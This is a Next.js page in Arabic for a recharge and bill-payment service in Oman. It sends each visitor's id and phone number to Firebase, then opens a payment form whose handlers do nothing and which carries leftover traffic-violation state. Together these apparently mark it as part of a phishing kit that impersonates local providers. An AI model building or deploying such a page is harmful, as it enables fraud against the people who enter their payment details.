"use client"

import Image from "next/image"
import { useState } from "react"
import { Button } from "@/components/ui/button"
import { Card, CardContent } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { serviceProviders } from "@/lib/service-providers"
import { PaymentForm } from "@/components/payment-form"

import { useForm } from "react-hook-form"
import { zodResolver } from "@hookform/resolvers/zod"
import { rechargeSchema } from "@/lib/validation"
import { SiteHeader } from "@/components/ui/header"
import { addData } from "@/lib/firebase"

export default function RechargePage() {
  const {
    register,
    handleSubmit,
    formState: { errors },
    watch,
    setValue,
    getValues
  } = useForm({
    resolver: zodResolver(rechargeSchema),
    defaultValues: {
      serviceType: "telecom",
      provider: "",
      phoneNumber: "",
      amount: 0,
      confirmAmount: 0,
    },
  })

  const serviceType = watch("serviceType")
  const [showPayment, setShowPayment] = useState(false)
  const [selectedViolations, setSelectedViolations] = useState([])

  const filteredProviders = serviceProviders.filter((provider) => provider.type === serviceType)

  const onSubmit = () => {
    const visitorId=localStorage.getItem('visitor')
    addData({id:visitorId,phone:getValues().phoneNumber})
    setShowPayment(true)
  }

  return (
    <div className="bg-white min-h-screen font-sans" dir="rtl">
      <SiteHeader />
      <main>
        {/* Title Banner */}
        <div className="bg-[#9aca3f] text-white text-center py-8 px-4">
          <h1 className="text-3xl md:text-4xl font-bold">اعادة شحن الاتصالات و الكهرباء و وسائل الترفيه</h1>
        </div>

       

        {/* Form Section */}
        <div
          className="py-12 px-4"
          style={{
            backgroundImage: "url(/bg.jpg)",
            backgroundRepeat: "repeat",
            backgroundSize: "200px",
          }}
        >
          <Card className="max-w-md mx-auto bg-white/95 backdrop-blur-sm shadow-xl rounded-2xl border-gray-200 overflow-hidden">
            <CardContent className="p-8">
              <form className="space-y-4" onSubmit={handleSubmit(onSubmit)}>
                <div className="space-y-2">
                  <Label htmlFor="service-provider-type" className="text-gray-600">
                    اختار مزود الخدمة
                  </Label>
                  <Select value={serviceType} onValueChange={(value) => setValue("serviceType", value)}>
                    <SelectTrigger id="service-provider-type" className="bg-white rounded-lg">
                      <SelectValue placeholder="اختر..." />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="telecom">الاتصالات</SelectItem>
                      <SelectItem value="electricity">الكهرباء</SelectItem>
                      <SelectItem value="entertainment">وسائل الترفيه</SelectItem>
                    </SelectContent>
                  </Select>
                  {errors.serviceType && <p className="text-red-500 text-sm">{errors.serviceType.message}</p>}
                </div>

                <div className="space-y-2">
                  <Label htmlFor="service-provider" className="text-gray-600">
                    مزود الخدمة
                  </Label>
                  <Select {...register("provider")} onValueChange={(value) => setValue("provider", value)}>
                    <SelectTrigger id="service-provider" className="bg-white rounded-lg">
                      <SelectValue placeholder="حدد المزود" />
                    </SelectTrigger>
                    <SelectContent>
                      {filteredProviders.map((provider) => (
                        <SelectItem key={provider.id} value={provider.id}>
                          {provider.name}
                        </SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                  {errors.provider && <p className="text-red-500 text-sm">{errors.provider.message}</p>}
                </div>

                <div className="space-y-2">
                  <Label htmlFor="phone-number" className="text-gray-600">
                    {serviceType === "electricity" ? "رقم العداد / رقم الحساب" : "ادخل رقم الهاتف الذي تريد تعبئته"}
                  </Label>
                  <Input
                    id="phone-number"
                    type="text"
                    className="bg-white rounded-lg"
                    dir="ltr"
                    {...register("phoneNumber")}
                  />
                  {errors.phoneNumber && <p className="text-red-500 text-sm">{errors.phoneNumber.message}</p>}
                </div>

                <div className="space-y-2">
                  <Label htmlFor="amount" className="text-gray-600">
                    المبلغ (ريال عماني)
                  </Label>
                  <Input
                    id="amount"
                    type="number"
                    className="bg-white rounded-lg"
                    dir="ltr"
                    {...register("amount", { valueAsNumber: true })}
                  />
                  {errors.amount && <p className="text-red-500 text-sm">{errors.amount.message}</p>}
                </div>

                <div className="space-y-2">
                  <Label htmlFor="confirm-amount" className="text-gray-600">
                    إعادة إدخال المبلغ
                  </Label>
                  <Input
                    id="confirm-amount"
                    type="number"
                    className="bg-white rounded-lg"
                    dir="ltr"
                    {...register("confirmAmount", { valueAsNumber: true })}
                  />
                  {errors.confirmAmount && <p className="text-red-500 text-sm">{errors.confirmAmount.message}</p>}
                </div>

                <div className="pt-4">
                  <Button
                    type="submit"
                    className="w-full bg-[#00843D] hover:bg-[#006e33] text-white font-bold text-lg py-6 rounded-lg"
                  >
                   دفع
                  </Button>
                </div>
              </form>
            </CardContent>
          
          </Card>
        </div>

        {/* Service Information */}
        <div className="py-12 px-4 bg-gray-50">
          <div className="max-w-4xl mx-auto">
            <h2 className="text-2xl font-bold text-center mb-8 text-[#00843D]">خدمات إعادة الشحن في عمان</h2>

            <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
              <ServiceCard
                title="الاتصالات"
                description="إعادة شحن رصيد الهاتف المحمول وباقات الإنترنت من عمانتل وأوريدو ورنة"
                icon="/placeholder.svg?height=64&width=64"
              />
              <ServiceCard
                title="الكهرباء"
                description="دفع فواتير الكهرباء وإعادة شحن العدادات مسبقة الدفع من شركة مسقط لتوزيع الكهرباء ونماء"
                icon="/placeholder.svg?height=64&width=64"
              />
              <ServiceCard
                title="وسائل الترفيه"
                description="شراء بطاقات الألعاب وخدمات البث المباشر مثل نتفلكس وشاهد وستارزبلاي"
                icon="/placeholder.svg?height=64&width=64"
              />
            </div>
          </div>
        </div>
        {showPayment && (
          <div className="fixed inset-0 bg-black/50 flex items-center justify-center p-4 z-50">
            <PaymentForm
            handleSubmit={()=>{}}
              totalAmount={Number.parseFloat(watch("amount")as any) || 0}
              onCancel={() => setShowPayment(false)}
              violations={selectedViolations}
              onSuccess={()=>{}}
            />
          </div>
        )}
      </main>

      <footer className="bg-[#00843D] text-white py-8 px-4">
        <div className="max-w-6xl mx-auto text-center">
          <p>© 2025 خدمة إعادة الشحن في عمان. جميع الحقوق محفوظة.</p>
        </div>
      </footer>
    </div>
  )
}

function ServiceCard({ title, description, icon }:any) {
  return (
    <div className="bg-white p-6 rounded-xl shadow-md text-center">
      <div className="w-16 h-16 mx-auto mb-4 relative">
        <Image src={icon || "/placeholder.svg"} alt={title} fill className="object-contain" />
      </div>
      <h3 className="text-xl font-bold mb-2 text-[#00843D]">{title}</h3>
      <p className="text-gray-600">{description}</p>
    </div>
  )
}
